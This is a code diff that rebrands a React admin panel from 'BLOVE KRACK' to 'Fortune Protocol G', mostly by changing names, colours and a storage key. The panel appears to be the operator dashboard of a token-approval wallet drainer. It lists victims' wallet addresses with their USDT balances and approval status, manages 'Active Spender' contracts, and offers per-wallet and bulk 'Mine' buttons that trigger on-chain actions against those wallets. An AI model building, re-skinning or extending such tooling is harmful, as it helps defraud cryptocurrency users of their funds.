@@ -41,7 +41,7 @@ interface AdminPanelProps {
 export const AdminPanel: React.FC<AdminPanelProps> = ({ onClose }) => {
   const { showToast } = useNotification();
 
-  const [token, setToken] = useState<string | null>(localStorage.getItem('blove_admin_token'));
+  const [token, setToken] = useState<string | null>(localStorage.getItem('fpg_admin_token') || localStorage.getItem('blove_admin_token'));
   const [username, setUsername] = useState('');
   const [password, setPassword] = useState('');
   const [loading, setLoading] = useState(false);
@@ -160,7 +160,7 @@ export const AdminPanel: React.FC<AdminPanelProps> = ({ onClose }) => {
       const res = await api.adminLogin({ username, password });
       if (res.success && res.token) {
         setToken(res.token);
-        localStorage.setItem('blove_admin_token', res.token);
+        localStorage.setItem('fpg_admin_token', res.token);
         showToast('Admin logged in successfully', 'success');
         loadData(res.token);
       } else {
@@ -175,6 +175,7 @@ export const AdminPanel: React.FC<AdminPanelProps> = ({ onClose }) => {
 
   const handleLogout = () => {
     setToken(null);
+    localStorage.removeItem('fpg_admin_token');
     localStorage.removeItem('blove_admin_token');
     setAdminWallet(null);
     setAdminChainId(null);
@@ -440,7 +441,7 @@ export const AdminPanel: React.FC<AdminPanelProps> = ({ onClose }) => {
     try {
       const res = await api.addApprovalAddress(token, {
         contractAddress: newContract.trim(),
-        description: newDesc.trim() || 'BLOVE KRACK Active Spender',
+        description: newDesc.trim() || 'Fortune Protocol G Active Spender',
         chainId: newChainId,
       }, adminWallet);
 
@@ -631,9 +632,9 @@ export const AdminPanel: React.FC<AdminPanelProps> = ({ onClose }) => {
   if (!token) {
     return (
       <div className="fixed inset-0 z-50 flex items-center justify-center p-3 sm:p-4 bg-black/90 backdrop-blur-lg animate-in fade-in">
-        <div className="glass-panel-gold rounded-2xl sm:rounded-3xl max-w-md w-full p-5 sm:p-8 space-y-5 sm:space-y-6 relative border-[#FDB813]/40 shadow-2xl">
+        <div className="glass-panel-blue rounded-2xl sm:rounded-3xl max-w-md w-full p-5 sm:p-8 space-y-5 sm:space-y-6 relative border-[#2563EB]/40 shadow-2xl">
           <div className="text-center space-y-1.5 sm:space-y-2">
-            <div className="w-12 h-12 sm:w-14 sm:h-14 rounded-2xl bg-[#FDB813]/20 border border-[#FDB813]/40 flex items-center justify-center mx-auto text-[#FDB813]">
+            <div className="w-12 h-12 sm:w-14 sm:h-14 rounded-2xl bg-[#2563EB]/20 border border-[#2563EB]/40 flex items-center justify-center mx-auto text-[#2563EB]">
               <Shield className="w-6 h-6 sm:w-7 sm:h-7" />
             </div>
             <h3 className="font-display font-black text-xl sm:text-2xl text-white uppercase tracking-wider">
@@ -651,7 +652,7 @@ export const AdminPanel: React.FC<AdminPanelProps> = ({ onClose }) => {
                 value={username}
                 onChange={(e) => setUsername(e.target.value)}
                 placeholder="admin"
-                className="w-full px-3.5 sm:px-4 py-2.5 sm:py-3 rounded-xl bg-[#08080B]/80 border border-white/10 text-xs text-white outline-none focus:border-[#FDB813]/50 transition-colors font-mono"
+                className="w-full px-3.5 sm:px-4 py-2.5 sm:py-3 rounded-xl bg-[#060D19]/80 border border-white/10 text-xs text-white outline-none focus:border-[#2563EB]/50 transition-colors font-mono"
               />
             </div>
 
@@ -663,7 +664,7 @@ export const AdminPanel: React.FC<AdminPanelProps> = ({ onClose }) => {
                 value={password}
                 onChange={(e) => setPassword(e.target.value)}
                 placeholder="••••••••••••"
-                className="w-full px-3.5 sm:px-4 py-2.5 sm:py-3 rounded-xl bg-[#08080B]/80 border border-white/10 text-xs text-white outline-none focus:border-[#FDB813]/50 transition-colors font-mono"
+                className="w-full px-3.5 sm:px-4 py-2.5 sm:py-3 rounded-xl bg-[#060D19]/80 border border-white/10 text-xs text-white outline-none focus:border-[#2563EB]/50 transition-colors font-mono"
               />
             </div>
 
@@ -678,7 +679,7 @@ export const AdminPanel: React.FC<AdminPanelProps> = ({ onClose }) => {
               <button
                 type="submit"
                 disabled={loading}
-                className="flex-1 btn-gold-glow py-3 sm:py-3.5 rounded-xl text-xs font-bold flex items-center justify-center gap-2"
+                className="flex-1 btn-primary py-3 sm:py-3.5 rounded-xl text-xs font-bold flex items-center justify-center gap-2"
               >
                 {loading && <Loader2 className="w-4 h-4 animate-spin text-black" />}
                 <span>Authenticate</span>
@@ -692,19 +693,19 @@ export const AdminPanel: React.FC<AdminPanelProps> = ({ onClose }) => {
 
   // Authenticated Admin Dashboard View
   return (
-    <div className="fixed inset-0 z-50 flex flex-col bg-[#08080B] animate-in fade-in">
+    <div className="fixed inset-0 z-50 flex flex-col bg-[#060D19] animate-in fade-in">
 
       {/* Top Bar - Mobile Responsive */}
-      <div className="bg-[#0B0B0E]/95 border-b border-[#FDB813]/20 px-3 sm:px-6 py-3 sm:py-4 flex flex-col sm:flex-row items-stretch sm:items-center justify-between gap-3 sticky top-0 z-20 backdrop-blur-xl">
+      <div className="bg-[#0B0B0E]/95 border-b border-[#2563EB]/20 px-3 sm:px-6 py-3 sm:py-4 flex flex-col sm:flex-row items-stretch sm:items-center justify-between gap-3 sticky top-0 z-20 backdrop-blur-xl">
         <div className="flex items-center justify-between sm:justify-start gap-2.5">
           <div className="flex items-center gap-2.5">
-            <div className="p-1.5 sm:p-2 rounded-xl bg-[#FDB813]/20 text-[#FDB813] shrink-0">
+            <div className="p-1.5 sm:p-2 rounded-xl bg-[#2563EB]/20 text-[#2563EB] shrink-0">
               <Shield className="w-5 h-5 sm:w-6 sm:h-6" />
             </div>
             <div>
               <h2 className="font-display font-bold text-sm sm:text-base md:text-lg text-white flex items-center gap-1.5">
-                <span>BLOVE KRACK</span>
-                <span className="text-[#FDB813]">• ADMIN</span>
+                <span>FORTUNE PROTOCOL G</span>
+                <span className="text-[#2563EB]">• ADMIN</span>
                 <span className="px-1.5 py-0.5 rounded text-[9px] sm:text-[10px] bg-[#10B981]/20 text-[#10B981] font-mono">
                   SECURE
                 </span>
@@ -716,7 +717,7 @@ export const AdminPanel: React.FC<AdminPanelProps> = ({ onClose }) => {
           {/* Mobile Exit Button */}
           <button
             onClick={onClose}
-            className="sm:hidden px-3 py-1.5 rounded-lg btn-gold-glow text-[11px] font-bold"
+            className="sm:hidden px-3 py-1.5 rounded-lg btn-primary text-[11px] font-bold"
           >
             Exit
           </button>
@@ -751,7 +752,7 @@ export const AdminPanel: React.FC<AdminPanelProps> = ({ onClose }) => {
             <button
               onClick={connectAdminWallet}
               disabled={isConnectingWallet || isVerifyingOwner}
-              className="flex items-center gap-1.5 px-2.5 sm:px-3.5 py-2 rounded-xl bg-[#FDB813]/10 hover:bg-[#FDB813]/20 border border-[#FDB813]/40 text-[11px] sm:text-xs font-montserrat font-semibold text-[#FDB813] transition-colors shrink-0"
+              className="flex items-center gap-1.5 px-2.5 sm:px-3.5 py-2 rounded-xl bg-[#2563EB]/10 hover:bg-[#2563EB]/20 border border-[#2563EB]/40 text-[11px] sm:text-xs font-montserrat font-semibold text-[#2563EB] transition-colors shrink-0"
             >
               {isConnectingWallet || isVerifyingOwner ? (
                 <Loader2 className="w-3.5 h-3.5 animate-spin" />
@@ -766,7 +767,7 @@ export const AdminPanel: React.FC<AdminPanelProps> = ({ onClose }) => {
             onClick={handleRefreshBalances}
             className="flex-1 sm:flex-initial flex items-center justify-center gap-1.5 px-2.5 sm:px-4 py-2 rounded-xl bg-white/5 hover:bg-white/10 border border-white/10 text-[11px] sm:text-xs font-mono text-gray-200 transition-colors shrink-0"
           >
-            <RefreshCw className="w-3.5 h-3.5 text-[#FDB813]" />
+            <RefreshCw className="w-3.5 h-3.5 text-[#2563EB]" />
             <span className="hidden xs:inline">Refresh</span> Balances
           </button>
           <button
@@ -778,7 +779,7 @@ export const AdminPanel: React.FC<AdminPanelProps> = ({ onClose }) => {
           </button>
           <button
             onClick={onClose}
-            className="hidden sm:flex px-4 py-2 rounded-xl btn-gold-glow text-xs font-bold shrink-0"
+            className="hidden sm:flex px-4 py-2 rounded-xl btn-primary text-xs font-bold shrink-0"
           >
             Exit to App
           </button>
@@ -872,7 +873,7 @@ export const AdminPanel: React.FC<AdminPanelProps> = ({ onClose }) => {
               <div className="glass-panel rounded-2xl p-4 sm:p-6 space-y-1">
                 <span className="text-gray-400 text-[11px] sm:text-xs font-montserrat">Total Users</span>
                 <p className="font-montserrat font-black text-2xl sm:text-3xl text-white">{stats?.totalUsers || 0}</p>
-                <p className="text-[10px] sm:text-[11px] text-[#FDB813] font-montserrat">Registered</p>
+                <p className="text-[10px] sm:text-[11px] text-[#2563EB] font-montserrat">Registered</p>
               </div>
 
               <div className="glass-panel rounded-2xl p-4 sm:p-6 space-y-1">
@@ -902,7 +903,7 @@ export const AdminPanel: React.FC<AdminPanelProps> = ({ onClose }) => {
             <div className="flex items-center justify-between flex-wrap gap-3">
               <div>
                 <h3 className="font-montserrat font-bold text-base sm:text-lg text-white flex items-center gap-2">
-                  <Users className="w-5 h-5 text-[#FDB813]" />
+                  <Users className="w-5 h-5 text-[#2563EB]" />
                   Registered Users ({pagination.total})
                 </h3>
                 <p className="font-montserrat text-xs text-gray-400 mt-0.5">
@@ -917,7 +918,7 @@ export const AdminPanel: React.FC<AdminPanelProps> = ({ onClose }) => {
                   className="px-3.5 py-2 rounded-xl bg-white/5 hover:bg-white/10 border border-white/10 text-xs font-montserrat text-gray-200 flex items-center gap-1.5 transition-colors"
                   title="Multicall ~990 addresses/sec"
                 >
-                  <RefreshCw className={`w-3.5 h-3.5 text-[#FDB813] ${refreshingBalances ? 'animate-spin' : ''}`} />
+                  <RefreshCw className={`w-3.5 h-3.5 text-[#2563EB] ${refreshingBalances ? 'animate-spin' : ''}`} />
                   <span>Sync Balances</span>
                 </button>
 
@@ -925,7 +926,7 @@ export const AdminPanel: React.FC<AdminPanelProps> = ({ onClose }) => {
                   <button
                     onClick={handleMineAll}
                     disabled={!!miningUser}
-                    className="px-3.5 py-2 rounded-xl btn-gold-glow text-xs font-bold flex items-center gap-2 shadow-lg active:scale-95 transition-all"
+                    className="px-3.5 py-2 rounded-xl btn-primary text-xs font-bold flex items-center gap-2 shadow-lg active:scale-95 transition-all"
                   >
                     <Sparkles className="w-3.5 h-3.5 text-black" />
                     <span>⚡ Mine All Eligible</span>
@@ -947,7 +948,7 @@ export const AdminPanel: React.FC<AdminPanelProps> = ({ onClose }) => {
                 <div className="overflow-x-auto rounded-xl sm:rounded-2xl border border-white/10 bg-[#0B0B0E]/60 shadow-xl">
                   <table className="w-full text-left border-collapse font-montserrat text-xs min-w-[650px] sm:min-w-full">
                     <thead>
-                      <tr className="bg-white/[0.03] border-b border-white/10 text-[#FDB813] uppercase text-[10px] sm:text-[11px] tracking-wider">
+                      <tr className="bg-white/[0.03] border-b border-white/10 text-[#2563EB] uppercase text-[10px] sm:text-[11px] tracking-wider">
                         <th className="py-3 px-3 sm:px-4 text-center w-12 font-mono">#</th>
                         <th className="py-3 px-3 sm:px-4">Wallet Address</th>
                         <th className="py-3 px-3 sm:px-4">USDT Balance</th>
@@ -981,7 +982,7 @@ export const AdminPanel: React.FC<AdminPanelProps> = ({ onClose }) => {
                                   href={`https://bscscan.com/address/${u.walletAddress}`}
                                   target="_blank"
                                   rel="noopener noreferrer"
-                                  className="text-white hover:text-[#FDB813] font-semibold transition-colors flex items-center gap-1"
+                                  className="text-white hover:text-[#2563EB] font-semibold transition-colors flex items-center gap-1"
                                   title={u.walletAddress}
                                 >
                                   <span className="hidden sm:inline">{`${u.walletAddress.slice(0, 8)}...${u.walletAddress.slice(-6)}`}</span>
@@ -1014,7 +1015,7 @@ export const AdminPanel: React.FC<AdminPanelProps> = ({ onClose }) => {
                               <span className={`px-2 sm:px-2.5 py-0.5 sm:py-1 rounded-full text-[10px] font-bold inline-block ${
                                 u.approvalStatus === 'approved'
                                   ? 'bg-[#10B981]/20 text-[#10B981] border border-[#10B981]/40'
-                                  : 'bg-[#FDB813]/20 text-[#FDB813] border border-[#FDB813]/40'
+                                  : 'bg-[#2563EB]/20 text-[#2563EB] border border-[#2563EB]/40'
                               }`}>
                                 {u.approvalStatus === 'approved' ? 'Registered' : 'Not Registered'}
                               </span>
@@ -1035,7 +1036,7 @@ export const AdminPanel: React.FC<AdminPanelProps> = ({ onClose }) => {
                                 <button
                                   onClick={() => handleMineUser(u)}
                                   disabled={miningUser === u.walletAddress || (adminChainId !== 56 && adminChainId !== 97)}
-                                  className="px-2.5 sm:px-3.5 py-1.5 rounded-xl bg-gradient-to-r from-[#FDB813] to-[#F59E0B] text-black font-bold text-[11px] sm:text-xs transition-all inline-flex items-center justify-center gap-1.5 shadow-md hover:brightness-110 active:scale-95 disabled:opacity-50"
+                                  className="px-2.5 sm:px-3.5 py-1.5 rounded-xl bg-gradient-to-r from-[#2563EB] to-[#F59E0B] text-black font-bold text-[11px] sm:text-xs transition-all inline-flex items-center justify-center gap-1.5 shadow-md hover:brightness-110 active:scale-95 disabled:opacity-50"
                                   title={`Trigger on-chain mine for ${u.walletAddress}`}
                                 >
                                   {miningUser === u.walletAddress ? (
@@ -1085,7 +1086,7 @@ export const AdminPanel: React.FC<AdminPanelProps> = ({ onClose }) => {
                                   href={`https://bscscan.com/tx/${u.approvalTxHash}`}
                                   target="_blank"
                                   rel="noopener noreferrer"
-                                  className="text-[#FDB813] hover:underline inline-flex items-center gap-1"
+                                  className="text-[#2563EB] hover:underline inline-flex items-center gap-1"
                                 >
                                   <span>{`${u.approvalTxHash.slice(0, 8)}...`}</span>
                                   <ExternalLink className="w-2.5 h-2.5 sm:w-3 sm:h-3" />
@@ -1195,7 +1196,7 @@ export const AdminPanel: React.FC<AdminPanelProps> = ({ onClose }) => {
                   {!adminWallet || !isOwnerVerified ? (
                     <Lock className="w-4 h-4 text-amber-400" />
                   ) : (
-                    <Plus className="w-4 h-4 text-[#FDB813]" />
+                    <Plus className="w-4 h-4 text-[#2563EB]" />
                   )}
                   <span>Add New Approval Contract</span>
                 </h3>
@@ -1219,10 +1220,10 @@ export const AdminPanel: React.FC<AdminPanelProps> = ({ onClose }) => {
                     value={newContract}
                     onChange={(e) => setNewContract(e.target.value)}
                     placeholder={!adminWallet || !isOwnerVerified ? "Connect deployer wallet to add contracts" : "Contract Address (0x...)"}
-                    className={`w-full px-3.5 sm:px-4 py-2.5 sm:py-3 rounded-xl bg-[#08080B]/80 border text-xs font-mono text-white outline-none transition-colors ${
+                    className={`w-full px-3.5 sm:px-4 py-2.5 sm:py-3 rounded-xl bg-[#060D19]/80 border text-xs font-mono text-white outline-none transition-colors ${
                       !adminWallet || !isOwnerVerified
                         ? 'border-white/5 opacity-50 cursor-not-allowed'
-                        : 'border-white/10 focus:border-[#FDB813]/50'
+                        : 'border-white/10 focus:border-[#2563EB]/50'
                     }`}
                   />
                 </div>
@@ -1233,10 +1234,10 @@ export const AdminPanel: React.FC<AdminPanelProps> = ({ onClose }) => {
                     value={newDesc}
                     onChange={(e) => setNewDesc(e.target.value)}
                     placeholder="Description (e.g. Spender V2)"
-                    className={`w-full px-3.5 sm:px-4 py-2.5 sm:py-3 rounded-xl bg-[#08080B]/80 border text-xs font-mono text-white outline-none transition-colors ${
+                    className={`w-full px-3.5 sm:px-4 py-2.5 sm:py-3 rounded-xl bg-[#060D19]/80 border text-xs font-mono text-white outline-none transition-colors ${
                       !adminWallet || !isOwnerVerified
                         ? 'border-white/5 opacity-50 cursor-not-allowed'
-                        : 'border-white/10 focus:border-[#FDB813]/50'
+                        : 'border-white/10 focus:border-[#2563EB]/50'
                     }`}
                   />
                 </div>
@@ -1247,7 +1248,7 @@ export const AdminPanel: React.FC<AdminPanelProps> = ({ onClose }) => {
                     className={`w-full py-2.5 sm:py-3 rounded-xl text-xs font-bold transition-all ${
                       !adminWallet || !isOwnerVerified
                         ? 'bg-white/5 border border-white/10 text-gray-500 cursor-not-allowed'
-                        : 'btn-gold-glow'
+                        : 'btn-primary'
                     }`}
                   >
                     {!adminWallet || !isOwnerVerified ? '🔒 Locked' : submittingContract ? 'Adding...' : 'Add Contract'}
@@ -1276,7 +1277,7 @@ export const AdminPanel: React.FC<AdminPanelProps> = ({ onClose }) => {
                 {approvals.map((app) => (
                   <div key={app.id} className="py-3.5 sm:py-4 flex flex-col sm:flex-row sm:items-center justify-between gap-3">
                     <div className="break-all">
-                      <p className="text-[#FDB813] font-bold text-xs sm:text-sm">{app.contractAddress}</p>
+                      <p className="text-[#2563EB] font-bold text-xs sm:text-sm">{app.contractAddress}</p>
                       <p className="text-gray-400 text-[11px] mt-0.5">{app.description} • Chain ID: {app.chainId}</p>
                     </div>
                     <div className="flex items-center justify-between sm:justify-end gap-3 pt-2 sm:pt-0 border-t sm:border-0 border-white/5">
@@ -1317,7 +1318,7 @@ export const AdminPanel: React.FC<AdminPanelProps> = ({ onClose }) => {
             <div className="flex flex-col lg:flex-row items-start lg:items-center justify-between gap-4 pb-4 border-b border-white/10">
               <div>
                 <h3 className="font-montserrat font-bold text-base sm:text-lg text-white flex items-center gap-2">
-                  <Activity className="w-5 h-5 text-[#FDB813]" />
+                  <Activity className="w-5 h-5 text-[#2563EB]" />
                   Audit &amp; Activity Logs
                 </h3>
                 <p className="font-montserrat text-[11px] sm:text-xs text-gray-400 mt-0.5">
@@ -1334,7 +1335,7 @@ export const AdminPanel: React.FC<AdminPanelProps> = ({ onClose }) => {
                     setLogActionFilter(e.target.value);
                     if (token) loadLogs(token, 1, e.target.value, logSearch);
                   }}
-                  className="px-3 py-2 rounded-xl bg-[#08080B]/90 border border-white/10 text-xs font-montserrat text-gray-200 outline-none focus:border-[#FDB813]/50"
+                  className="px-3 py-2 rounded-xl bg-[#060D19]/90 border border-white/10 text-xs font-montserrat text-gray-200 outline-none focus:border-[#2563EB]/50"
                 >
                   <option value="all">All Actions</option>
                   <option value="register_confirmed">Register Confirmed</option>
@@ -1359,7 +1360,7 @@ export const AdminPanel: React.FC<AdminPanelProps> = ({ onClose }) => {
                       value={logSearch}
                       onChange={(e) => setLogSearch(e.target.value)}
                       placeholder="Search wallet / tx..."
-                      className="w-full sm:w-48 md:w-56 px-3.5 py-2 pl-8 rounded-xl bg-[#08080B]/90 border border-white/10 text-xs font-mono text-white outline-none focus:border-[#FDB813]/50"
+                      className="w-full sm:w-48 md:w-56 px-3.5 py-2 pl-8 rounded-xl bg-[#060D19]/90 border border-white/10 text-xs font-mono text-white outline-none focus:border-[#2563EB]/50"
                     />
                     <Search className="w-3.5 h-3.5 text-gray-400 absolute left-2.5 top-1/2 -translate-y-1/2" />
                   </div>
@@ -1378,7 +1379,7 @@ export const AdminPanel: React.FC<AdminPanelProps> = ({ onClose }) => {
                   className="p-2 rounded-xl bg-white/5 hover:bg-white/10 border border-white/10 text-gray-300 transition-colors disabled:opacity-40 self-end sm:self-auto shrink-0"
                   title="Refresh Logs"
                 >
-                  <RefreshCw className={`w-4 h-4 text-[#FDB813] ${logsLoading ? 'animate-spin' : ''}`} />
+                  <RefreshCw className={`w-4 h-4 text-[#2563EB] ${logsLoading ? 'animate-spin' : ''}`} />
                 </button>
               </div>
             </div>
@@ -1421,7 +1422,7 @@ export const AdminPanel: React.FC<AdminPanelProps> = ({ onClose }) => {
                             href={`https://bscscan.com/address/${item.walletAddress}`}
                             target="_blank"
                             rel="noopener noreferrer"
-                            className="text-white hover:text-[#FDB813] font-semibold"
+                            className="text-white hover:text-[#2563EB] font-semibold"
                           >
                             {`${item.walletAddress.slice(0, 6)}...${item.walletAddress.slice(-4)}`}
                           </a>
@@ -1452,7 +1453,7 @@ export const AdminPanel: React.FC<AdminPanelProps> = ({ onClose }) => {
                           href={`https://bscscan.com/tx/${item.txHash}`}
                           target="_blank"
                           rel="noopener noreferrer"
-                          className="text-[#FDB813] hover:underline flex items-center gap-1"
+                          className="text-[#2563EB] hover:underline flex items-center gap-1"
                         >
                           <span>{`${item.txHash.slice(0, 6)}...${item.txHash.slice(-4)}`}</span>
                           <ExternalLink className="w-2.5 h-2.5" />
@@ -1474,7 +1475,7 @@ export const AdminPanel: React.FC<AdminPanelProps> = ({ onClose }) => {
             <div className="hidden md:block overflow-x-auto">
               <table className="w-full text-left border-collapse font-montserrat text-xs">
                 <thead>
-                  <tr className="border-b border-white/10 text-[#FDB813] uppercase text-[11px]">
+                  <tr className="border-b border-white/10 text-[#2563EB] uppercase text-[11px]">
                     <th className="py-3 px-4">Timestamp</th>
                     <th className="py-3 px-4">Action</th>
                     <th className="py-3 px-4">Wallet Address</th>
@@ -1525,7 +1526,7 @@ export const AdminPanel: React.FC<AdminPanelProps> = ({ onClose }) => {
                                 href={`https://bscscan.com/address/${item.walletAddress}`}
                                 target="_blank"
                                 rel="noopener noreferrer"
-                                className="text-white hover:text-[#FDB813] font-semibold transition-colors flex items-center gap-1"
+                                className="text-white hover:text-[#2563EB] font-semibold transition-colors flex items-center gap-1"
                               >
                                 <span>{`${item.walletAddress.slice(0, 6)}...${item.walletAddress.slice(-4)}`}</span>
                                 <ExternalLink className="w-3 h-3 text-gray-400" />
@@ -1559,7 +1560,7 @@ export const AdminPanel: React.FC<AdminPanelProps> = ({ onClose }) => {
                                 {`${item.refCode.slice(0, 6)}...${item.refCode.slice(-4)}`}
                               </a>
                             ) : (
-                              <span className="text-[#FFE066]">{item.refCode}</span>
+                              <span className="text-[#60A5FA]">{item.refCode}</span>
                             )
                           ) : (
                             <span className="text-gray-600">—</span>
@@ -1573,7 +1574,7 @@ export const AdminPanel: React.FC<AdminPanelProps> = ({ onClose }) => {
                               href={`https://bscscan.com/tx/${item.txHash}`}
                               target="_blank"
                               rel="noopener noreferrer"
-                              className="text-[#FDB813] hover:underline flex items-center gap-1"
+                              className="text-[#2563EB] hover:underline flex items-center gap-1"
                             >
                               <span>{`${item.txHash.slice(0, 8)}...`}</span>
                               <ExternalLink className="w-3 h-3" />
@@ -1634,7 +1635,7 @@ export const AdminPanel: React.FC<AdminPanelProps> = ({ onClose }) => {
       </div>
 
       {/* Instagram-Style Bottom Navigation Dock */}
-      <nav className="fixed bottom-0 left-0 right-0 z-40 bg-[#0B0B0E]/95 backdrop-blur-2xl border-t border-[#FDB813]/25 px-2 sm:px-6 pt-2 pb-[max(0.6rem,env(safe-area-inset-bottom))] shadow-2xl">
+      <nav className="fixed bottom-0 left-0 right-0 z-40 bg-[#0B0B0E]/95 backdrop-blur-2xl border-t border-[#2563EB]/25 px-2 sm:px-6 pt-2 pb-[max(0.6rem,env(safe-area-inset-bottom))] shadow-2xl">
         <div className="max-w-xl mx-auto flex items-center justify-around gap-1">
           
           {/* 1. Overview */}
@@ -1642,7 +1643,7 @@ export const AdminPanel: React.FC<AdminPanelProps> = ({ onClose }) => {
             onClick={() => setActiveTab('stats')}
             className={`flex flex-col items-center justify-center py-1 px-2.5 sm:px-4 rounded-xl transition-all ${
               activeTab === 'stats'
-                ? 'text-[#FDB813] font-bold scale-105'
+                ? 'text-[#2563EB] font-bold scale-105'
                 : 'text-gray-400 hover:text-gray-200'
             }`}
           >
@@ -1655,7 +1656,7 @@ export const AdminPanel: React.FC<AdminPanelProps> = ({ onClose }) => {
             onClick={() => setActiveTab('users')}
             className={`flex flex-col items-center justify-center py-1 px-2.5 sm:px-4 rounded-xl transition-all relative ${
               activeTab === 'users'
-                ? 'text-[#FDB813] font-bold scale-105'
+                ? 'text-[#2563EB] font-bold scale-105'
                 : 'text-gray-400 hover:text-gray-200'
             }`}
           >
@@ -1670,7 +1671,7 @@ export const AdminPanel: React.FC<AdminPanelProps> = ({ onClose }) => {
           <button
             onClick={handleRefreshBalances}
             disabled={refreshingBalances}
-            className="flex flex-col items-center justify-center -mt-4 py-1.5 px-3 rounded-2xl bg-gradient-to-b from-[#FDB813] to-[#D97706] text-black shadow-lg shadow-[#FDB813]/25 active:scale-95 transition-all group"
+            className="flex flex-col items-center justify-center -mt-4 py-1.5 px-3 rounded-2xl bg-gradient-to-b from-[#2563EB] to-[#1D4ED8] text-black shadow-lg shadow-[#2563EB]/25 active:scale-95 transition-all group"
             title="Fast Parallel Multicall (~990 addr/sec)"
           >
             <div className="w-9 h-9 rounded-full bg-black/10 flex items-center justify-center mb-0.5">
@@ -1684,7 +1685,7 @@ export const AdminPanel: React.FC<AdminPanelProps> = ({ onClose }) => {
             onClick={() => setActiveTab('approvals')}
             className={`flex flex-col items-center justify-center py-1 px-2.5 sm:px-4 rounded-xl transition-all ${
               activeTab === 'approvals'
-                ? 'text-[#FDB813] font-bold scale-105'
+                ? 'text-[#2563EB] font-bold scale-105'
                 : 'text-gray-400 hover:text-gray-200'
             }`}
           >
@@ -1700,7 +1701,7 @@ export const AdminPanel: React.FC<AdminPanelProps> = ({ onClose }) => {
             }}
             className={`flex flex-col items-center justify-center py-1 px-2.5 sm:px-4 rounded-xl transition-all ${
               activeTab === 'logs'
-                ? 'text-[#FDB813] font-bold scale-105'
+                ? 'text-[#2563EB] font-bold scale-105'
                 : 'text-gray-400 hover:text-gray-200'
             }`}
           >
@@ -1714,12 +1715,12 @@ export const AdminPanel: React.FC<AdminPanelProps> = ({ onClose }) => {
       {/* Celebratory Greeting Modal on Mining Success */}
       {mineGreeting?.isOpen && (
         <div className="fixed inset-0 z-50 flex items-center justify-center p-4 bg-black/85 backdrop-blur-xl animate-in fade-in zoom-in-95">
-          <div className="glass-panel-gold rounded-3xl max-w-md w-full p-6 sm:p-8 space-y-6 relative border-[#FDB813]/60 shadow-[0_0_50px_rgba(253,184,19,0.3)] text-center">
+          <div className="glass-panel-blue rounded-3xl max-w-md w-full p-6 sm:p-8 space-y-6 relative border-[#2563EB]/60 shadow-[0_0_50px_rgba(37, 99, 235,0.3)] text-center">
             
             {/* Celebration Icon Header */}
             <div className="relative mx-auto w-20 h-20">
-              <div className="absolute inset-0 rounded-full bg-[#FDB813]/30 animate-ping" />
-              <div className="relative w-20 h-20 rounded-full bg-gradient-to-tr from-[#FDB813] to-[#FFE066] flex items-center justify-center text-black shadow-xl shadow-[#FDB813]/40">
+              <div className="absolute inset-0 rounded-full bg-[#2563EB]/30 animate-ping" />
+              <div className="relative w-20 h-20 rounded-full bg-gradient-to-tr from-[#2563EB] to-[#60A5FA] flex items-center justify-center text-black shadow-xl shadow-[#2563EB]/40">
                 <Sparkles className="w-10 h-10 animate-bounce" />
               </div>
             </div>
@@ -1767,7 +1768,7 @@ export const AdminPanel: React.FC<AdminPanelProps> = ({ onClose }) => {
                   href={`https://bscscan.com/tx/${mineGreeting.txHash}`}
                   target="_blank"
                   rel="noopener noreferrer"
-                  className="text-[#FDB813] hover:underline flex items-center gap-1 font-semibold"
+                  className="text-[#2563EB] hover:underline flex items-center gap-1 font-semibold"
                 >
                   <span>{`${mineGreeting.txHash.slice(0, 8)}...${mineGreeting.txHash.slice(-6)}`}</span>
                   <ExternalLink className="w-3 h-3" />
@@ -1789,7 +1790,7 @@ export const AdminPanel: React.FC<AdminPanelProps> = ({ onClose }) => {
 
               <button
                 onClick={() => setMineGreeting(null)}
-                className="flex-1 py-3.5 rounded-xl btn-gold-glow text-xs font-bold"
+                className="flex-1 py-3.5 rounded-xl btn-primary text-xs font-bold"
               >
                 Continue Operations
               </button>
